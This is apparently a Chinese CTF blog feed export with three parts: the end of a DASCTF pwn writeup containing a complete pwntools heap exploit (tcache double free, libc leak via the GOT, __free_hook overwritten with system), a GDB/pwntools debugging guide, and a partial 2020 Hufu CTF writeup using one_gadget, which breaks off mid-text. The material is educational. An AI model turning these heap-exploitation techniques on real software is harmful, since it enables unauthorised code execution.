，泄露函数 got 表地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buy(<span class="number">0x10</span>,p64(elf.got[<span class="string">&#x27;malloc&#x27;</span>]))<span class="comment">#chunk1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>后面修改 got 表地址方法同上。</p><h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encodig:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./sales_office&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./sales_office&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;house:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;your house:&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sell</span>(<span class="params">index</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">buy(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#0</span></span><br><span class="line">buy(<span class="number">0x10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">buy(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">buy(<span class="number">0x10</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">buy(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">sell(<span class="number">0</span>)<span class="comment">#维持tcache数量平衡</span></span><br><span class="line">sell(<span class="number">1</span>)</span><br><span class="line">sell(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;house:\n&#x27;</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x2a0</span></span><br><span class="line">log.info(<span class="string">&#x27;HEAP:&#x27;</span>+ <span class="built_in">hex</span>(heap_base))</span><br><span class="line">buy(<span class="number">0x10</span>,p64(heap_base+<span class="number">0x2e0</span>))</span><br><span class="line">buy(<span class="number">0x40</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">buy(<span class="number">0x10</span>,p64(elf.got[<span class="string">&#x27;malloc&#x27;</span>]))<span class="comment">#chunk1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;house:\n&#x27;</span>)</span><br><span class="line">malloc_leak = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;malloc_leak:&quot;</span>+<span class="built_in">hex</span>(malloc_leak))</span><br><span class="line"></span><br><span class="line">libc_base = malloc_leak - libc.symbols[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;__free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">sell(<span class="number">3</span>)</span><br><span class="line">sell(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">buy(<span class="number">0x10</span>,p64(free_hook))</span><br><span class="line">buy(<span class="number">0x20</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">buy(<span class="number">0x10</span>,p64(system))</span><br><span class="line">sell(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> DASCTF </tag>
            
            <tag> 安恒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDB调试命令与技巧</title>
      <link href="archives/Infinity/"/>
      <url>archives/Infinity/</url>
      
        <content type="html"><![CDATA[<h2 id="x-查询指令"><a href="#x-查询指令" class="headerlink" title="x 查询指令"></a>x 查询指令</h2><p>[collapse title=”展开查看详情” status=”false”]</p><p><code>x</code> 指令用于查看内存地址的值，<code>x</code>命令语法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/&lt;n/f/u&gt; &lt;target addr&gt;</span><br></pre></td></tr></table></figure><ul><li>n ：输出个数</li><li>f ：显示格式。 在 pwn 题中通常都是使用 16 进制查看。<ul><li>x ：十六进制（常用）</li><li>d ：十进制格式</li><li>u ：十六进制格式显示无符号整型</li><li>o ：八进制格式量 </li><li>t ：二进制格式 </li><li>c ：字符格式 </li><li>f ：浮点数格式</li></ul></li><li>u ：查看字节单元数。在 pwn 题中，根据题目是 32 位还是 64 位灵活切换 w 和 g<ul><li>b ：单字节（8 位，1 个字节）</li><li>h ：双字节（16 位，2 个字节）</li><li>w ：字（32位，4 个字节）（常用）</li><li>g ：大字（64 位，8 个字节）（常用）</li></ul></li></ul><p>可能常用形式：</p><p><code>x /20xg addr</code>    查 64 位程序内存信息</p><p><code>x /20xw addr</code>    查 32 位程序内存信息</p><p>[/collapse]</p><h2 id="查看调用中的堆栈"><a href="#查看调用中的堆栈" class="headerlink" title="查看调用中的堆栈"></a>查看调用中的堆栈</h2><ul><li><code>where</code>：显示调用堆栈</li><li><code>frame</code>：显示调用堆栈顶部</li><li><code>up</code>：向调用堆栈底部移动</li><li><code>down</code>：向调用堆栈顶部移动</li></ul><h2 id="GDB-调试-PIE-程序"><a href="#GDB-调试-PIE-程序" class="headerlink" title="GDB 调试 PIE 程序"></a>GDB 调试 PIE 程序</h2><p>[collapse title=”展开查看详情” status=”false”]</p><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>安装 pwndbg 插件，然后这样下断点：0x相对基址偏移就是 IDA 显示的三位数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *$rebase(0x相对基址偏移)</span><br></pre></td></tr></table></figure><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>在 /proc 目录中，每个进程都会在此目录下新建一个以进程 id 为名的文件夹，其中存储着进程的动态链接和地址的信息。<br>在每个进程的 <em>map_file</em> 文件夹中，存储着各个地址段的动态链接文件（地址）。</p><p>查找当前进程 pid 为 6158 :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ps -aux|grep 程序名</span></span><br><span class="line">hu         6158  0.0  0.0   4356   632 pts/18   S+   07:50   0:00 ./程序名</span><br><span class="line">hu         6162  0.0  0.0  21292  1088 pts/20   S+   07:51   0:00 grep --color=auto 程序名</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>知道 pid 之后有两种方式获取 elf 机制</p><h4 id="方式一："><a href="#方式一：" class="headerlink" title="方式一："></a>方式一：</h4><p>进入目录 /proc/{pid}/map_files 查询动态链接文件（地址）:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">/proc/6158/map_files$</span><span class="bash"> ls</span></span><br><span class="line">557d7b317000-557d7b319000  7f0d1da3c000-7f0d1dc3c000  7f0d1de6b000-7f0d1de6c000</span><br><span class="line">557d7b518000-557d7b519000  7f0d1dc3c000-7f0d1dc40000  7f0d1de6c000-7f0d1de6d000</span><br><span class="line">557d7b519000-557d7b51a000  7f0d1dc40000-7f0d1dc42000</span><br><span class="line">7f0d1d87c000-7f0d1da3c000  7f0d1dc46000-7f0d1dc6c000</span><br></pre></td></tr></table></figure><p>第一个 0x557d7b317000 为 elf 基地址。</p><p>真实地址为：0x557d7b317000  + 偏移（ida显示的三位地址）</p><h4 id="方式二："><a href="#方式二：" class="headerlink" title="方式二："></a>方式二：</h4><p>使用 /usr/bin 目录下 pmap 程序。</p><p><em>pmap + pid</em>命令可以将该进程的地址信息和相应地址段的权限打印出。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/pmap 6158</span><br></pre></td></tr></table></figure><h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>IDA 远程调试</p><h3 id="与-Pwntools-联动"><a href="#与-Pwntools-联动" class="headerlink" title="与 Pwntools 联动"></a>与 Pwntools 联动</h3><p>上面方法都是在命令行启动的 GDB 情况下，如果编写成 exp 脚本调试方法看[这里](# Pwntools 调试 PIE 程序)</p><p>[/collapse]</p><h2 id="Pwntools-调试-PIE-程序"><a href="#Pwntools-调试-PIE-程序" class="headerlink" title="Pwntools 调试 PIE 程序"></a>Pwntools 调试 PIE 程序</h2><p>[collapse title=”展开查看详情” status=”false”]</p><h3 id="传入明确地址"><a href="#传入明确地址" class="headerlink" title="传入明确地址"></a>传入明确地址</h3><p>也就是在 <code>gdb.attach(p,&quot;b *真实地址&quot;)</code> 这样传参。这个真实地址寻址原理在 [GDB 调试 PIE 程序](# GDB 调试 PIE 程序) 提及，在 exp 中就用 os 库执行命令获取并传参。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 脚本摘选自网络，未找到原作者</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DEBUG</span>(<span class="params">bps=[],pie =<span class="literal">False</span></span>):</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="comment">#cmd=&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base =<span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        <span class="comment">#base =int(os.popen(&quot;pmap -x &#123;0&#125; &quot;.format(p.pid)).readlines()[2][:16],16)</span></span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *$rebase(&#123;:#x&#125;)\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if bps !=[]:</span></span><br><span class="line">    <span class="comment">#     cmd +=&#x27;c&#x27;</span></span><br><span class="line">    gdb.attach(p,cmd)</span><br></pre></td></tr></table></figure><p><code>base = int(os.popen(“pmap &#123;&#125;| awk ‘&#123;&#123;print $1&#125;&#125;’”.format(io.pid)).readlines()[1], 16)</code>获取 elf 基地址，根据传入偏移量，给<code>gdb.attach()</code>传入指令：<code>b *当前断点真实地址</code>。如果 pie 参数为假，传入指令：<code>b *$rebase(偏移量)</code>，偏移量是 ida 显示三位地址。</p><h3 id="传入偏移量"><a href="#传入偏移量" class="headerlink" title="传入偏移量"></a>传入偏移量</h3><p>和<a href="#%E4%BC%A0%E5%85%A5%E6%98%8E%E7%A1%AE%E5%9C%B0%E5%9D%80">传入明确地址</a> DEBUG 函数 pie 为假情况差不多。<em>但有帖子和我也试了一下，开启 pie 传入 gdb 命令</em> <code>b *$rebase(偏移量)</code> <em>还是能的。</em></p><p>在你想打断点的前面调用 <code>gdb.attach(p,&quot;b *$rebase(偏移量)&quot;)</code>，一般能停下来，但是会停在断点的前面，然后自己手动 step 单步过去咯。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *$rebase(偏移量)&quot;</span>)</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h2 id="单步跟还是会跳过一些指令"><a href="#单步跟还是会跳过一些指令" class="headerlink" title="单步跟还是会跳过一些指令"></a>单步跟还是会跳过一些指令</h2><p>[collapse title=”展开查看详情” status=”false”]</p><p>比如说 <code>call xxx@plt</code> 调用 plt 时，step 不会跟进 plt 函数中，改用 <strong>si</strong> 。</p><p>[/collapse]</p><h2 id="脚本中-GDB-放置位置"><a href="#脚本中-GDB-放置位置" class="headerlink" title="脚本中 GDB 放置位置"></a>脚本中 GDB 放置位置</h2><p>[collapse title=”展开查看详情” status=”false”]</p><p><strong>调用 gdb 有一定时延</strong></p><p>首先明确的在脚本中调用 gdb 并不是准确停在调用这一行，而是会执行到脚本的 下一（或几）行，举个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">&#x27;string1&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(<span class="string">&#x27;string2&#x27;</span>)</span><br></pre></td></tr></table></figure><p>log 中会看到 string2 已经输入了，gdb 才真正进入。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> string1[<span class="number">5</span>]=&#123;<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> string2[<span class="number">5</span>]= &#123;<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>&#125;;</span><br><span class="line">read(<span class="number">0</span>,string1,<span class="number">5</span>);</span><br><span class="line">read(<span class="number">0</span>,string2,<span class="number">5</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,string1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,string1);</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><p>假如想将上面这个程序，停在刚输入完而未进入 printf ，基于上面提及的特点，在最后一次输入前调用 gdb 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">5</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p><strong>总结</strong>：就是在最后一条输入命令前打断点。因为有时延，所以相邻命令也被执行。这种方法应该是用于大部分栈题目。堆题目因为菜单停顿，就直接调用咯。</p><p>[/collapse]</p><h2 id="GDB-没有调试信息"><a href="#GDB-没有调试信息" class="headerlink" title="GDB 没有调试信息"></a>GDB 没有调试信息</h2><p>[collapse title=”展开查看详情” status=”false”]</p><h3 id="程序已完成"><a href="#程序已完成" class="headerlink" title="程序已完成"></a>程序已完成</h3><p>顾名思义，程序已经退出，gdb 当然找不到进程信息。这种情况的几种可能：<strong>栈题目</strong>或者线性的程序（执行完一系列操作就退出）退出了；gdb 调用后面没有其他操作。</p><h3 id="程序退出情况"><a href="#程序退出情况" class="headerlink" title="程序退出情况"></a>程序退出情况</h3><p>提前调用 gdb 咯。且不要再脚本末尾调用 gdb ，就是避免[gdb 后无其他操作](# gdb 后无其他操作)。</p><h3 id="gdb-后无其他操作"><a href="#gdb-后无其他操作" class="headerlink" title="gdb 后无其他操作"></a>gdb 后无其他操作</h3><p>可能在堆调试比较常见，就在 gdb.attach() 后面加一行无关操作，比如说调用题目输出函数等，或者直接 sleep(1) ，等 gdb 获取到进程信息就行。</p><p>[/collapse]</p><h2 id="gdb-查询各内存段权限"><a href="#gdb-查询各内存段权限" class="headerlink" title="gdb 查询各内存段权限"></a>gdb 查询各内存段权限</h2><p>在有些题目 ida 分析的内存段权限好像有错误，可以用 gdb 验证。（eg：get_started_3dsctf_2016）</p><p>使用命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">maintenance info sections</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> maintenance info sections</span></span><br><span class="line">Exec file:</span><br><span class="line">    `/home/skye/buu/get_started_3dsctf_2016/get_started_3dsctf_2016&#x27;, file type elf32-i386.</span><br><span class="line"> [0]     0x80480f4-&gt;0x8048114 at 0x000000f4: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果需要在其他窗口调试，需要获取 PID ，具体请看这里：<a href="https://www.coder.work/article/168338">GDB检查内存权限</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> GDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gdb </tag>
            
            <tag> gdb调试 </tag>
            
            <tag> gdb调试命令 </tag>
            
            <tag> 调试技巧 </tag>
            
            <tag> gdb命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020虎符CTFWriteup</title>
      <link href="archives/e555c12a/"/>
      <url>archives/e555c12a/</url>
      
        <content type="html"><![CDATA[<h2 id="MarksMan"><a href="#MarksMan" class="headerlink" title="MarksMan"></a>MarksMan</h2><p><strong>考点：任意地址写</strong></p><p>程序保护措施全开，开局给一个<code>puts</code>的地址，然后就是直接进入任意地址写入操作。</p><p>写入的目标地址直接填十进制字符，程序会调用 atol 给它转为 int 型。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> atol(&amp;nptr);</span><br></pre></td></tr></table></figure><p>向目标地址写入只能是 3 个字节，也就是低三位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;biang!&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;v7[i], <span class="number">1uLL</span>);</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种题目貌似是前几个星期国外那边兴起的，然后基本套路就是在写入函数后（这题就是 main 函数 27 行之后）找 call 指令，找到适合的函数，修改为 onegadget 地址。</p><p>根据作者介绍，题目过滤了全部 one_gadget ，推测应该就是<code>sub_BC2</code>这个函数，如果不含有过滤的 onegadget 就返回 1 ，进入任意地址写操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">sub_BC2</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (*a1 != <span class="number">0xC5</span>u || a1[<span class="number">1</span>] != <span class="number">0xF2</span>u) &amp;&amp; (*a1 != <span class="number">0x22</span> || a1[<span class="number">1</span>] != <span class="number">0xF3</span>u) &amp;&amp; *a1 != <span class="number">0x8C</span>u &amp;&amp; a1[<span class="number">1</span>] != <span class="number">0xA3</span>u )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You always want a Gold Finger!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是又从别的大佬 wp 看到，其实<code>one_gadget xxxx</code>对于 onegadget 显示级别默认是 1 ，也就是只需要满足一个条件的，类似于这样:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ubuntu18:~/hufu/pwn1$ one_gadget libc.so.6 </span><br><span class="line">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rcx == NULL</span><br></pre></td></tr></table></figure><p>作者也就屏蔽了等级为 1 的 onegadget 。也就是说其他等级 onegadget 可能可用，<strong>显示其他等级 onegadget 加入参数<code>-lx</code>（x 为级别）</strong>，就能查询到这些：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ubuntu18:~/hufu/pwn1$ one_gadget libc.so.6 -l2</span><br><span class="line">0xe569f execve(&quot;/bin/sh&quot;, r14, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r14] == NULL || r14 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br></pre></td></tr></table></figure><h3 id="调试寻找合适-got-表地址"><a href="#调试寻找合适-got-表地址" class="headerlink" title="调试寻找合适 got 表地址"></a>调试寻找合适 got 表地址</h3><p>调试环节，也就是找合适的 call 。首先就需要知道你修改后的目标值（onegadget 地址），然后为了能运行到写入函数后，肯定就需要一个存在的写入地址，就随便选一个 libc 地址。</p><p>调试使用的地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">写入地址：0x00007f96485cbc30</span><br><span class="line">写入地址初始值：0x00007f29b7 40ea40</span><br><span class="line">onegadget 地址：0x00007f9648 2c569f</span><br><span class="line">寻找目标 got.plt 为：0x00007f9648 xxxxxx</span><br><span class="line">libc_base 为：0x00007f37f9d55000</span><br></pre></td></tr></table></figure><p>在最后一次输入修改值前下断点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;biang!\n&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *$rebase(0xd63)&#x27;</span>)</span><br><span class="line">p.sendline(p8((og&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>))</span><br></pre></td></tr></table></figure><p><code>step</code>单步调试，遇到 call 就<code>si</code>单步入调用 plt 函数，看跳转到 got.plt 哪里。</p><p>在 _dlerror_run+96 调用了 _dl_catch_error@plt 对应地址 0x7f37fa146d90 （_dl_catch_error plt 表地址）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  0x7f37fa14772a &lt;_dlerror_run+90&gt;     mov    r8, r12</span><br><span class="line">  0x7f37fa14772d &lt;_dlerror_run+93&gt;     mov    rcx, rbp</span><br><span class="line">► 0x7f37fa147730 &lt;_dlerror_run+96&gt;     call   _dl_catch_error@plt &lt;0x7f37fa146d90&gt;</span><br><span class="line">       rdi: 0x7f37fa3490f0 (last_result+16) ◂— 0x0</span><br><span class="line">       rsi: 0x7f37fa3490f8 (last_result+24) ◂— 0x0</span><br><span class="line">       rdx: 0x7f37fa3490e8 (last_result+8) ◂— 0x0</span><br><span class="line">       rcx: 0x7f37fa146f40 (dlopen_doit) ◂— push   rbx</span><br></pre></td></tr></table></figure><p>这里<code>si</code>单步入，到 plt 找跳转的 got.plt 地址。第一行就是跳转的地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">► 0x7f37fa146d90 &lt;_dl_catch_error@plt&gt;              jmp    qword ptr [rip + 0x2022a2] &lt;0x7f37fa349038&gt;</span><br><span class="line"> </span><br><span class="line">   0x7f37fa146d96 &lt;_dl_catch_error@plt+6&gt;            push   4</span><br><span class="line">   0x7f37fa146d9b &lt;_dl_catch_error@plt+11&gt;           jmp    0x7f37fa146d40</span><br><span 